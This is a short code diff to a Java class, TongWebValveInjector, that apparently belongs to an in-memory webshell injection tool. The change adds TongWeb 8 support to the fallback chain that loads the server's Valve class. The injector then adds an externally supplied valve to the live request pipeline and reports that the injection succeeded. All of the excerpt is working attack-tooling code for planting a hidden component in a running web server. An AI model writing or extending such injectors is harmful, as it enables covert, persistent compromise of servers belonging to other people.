@@ -84,12 +84,18 @@ public class TongWebValveInjector {
             return;
         }
         Class valveClass = null;
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
             // tongweb7
-            valveClass = context.getClass().getClassLoader().loadClass("com.tongweb.catalina.Valve");
+            valveClass = contextClassLoader.loadClass("com.tongweb.catalina.Valve");
         } catch (ClassNotFoundException e) {
-            // tongweb6
-            valveClass = context.getClass().getClassLoader().loadClass("com.tongweb.web.thor.Valve");
+            try {
+                // tongweb6
+                valveClass = contextClassLoader.loadClass("com.tongweb.web.thor.Valve");
+            } catch (ClassNotFoundException e1) {
+                // tongweb8
+                valveClass = contextClassLoader.loadClass("com.tongweb.server.Valve");
+            }
         }
         invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
         System.out.println("valve injected successfully");
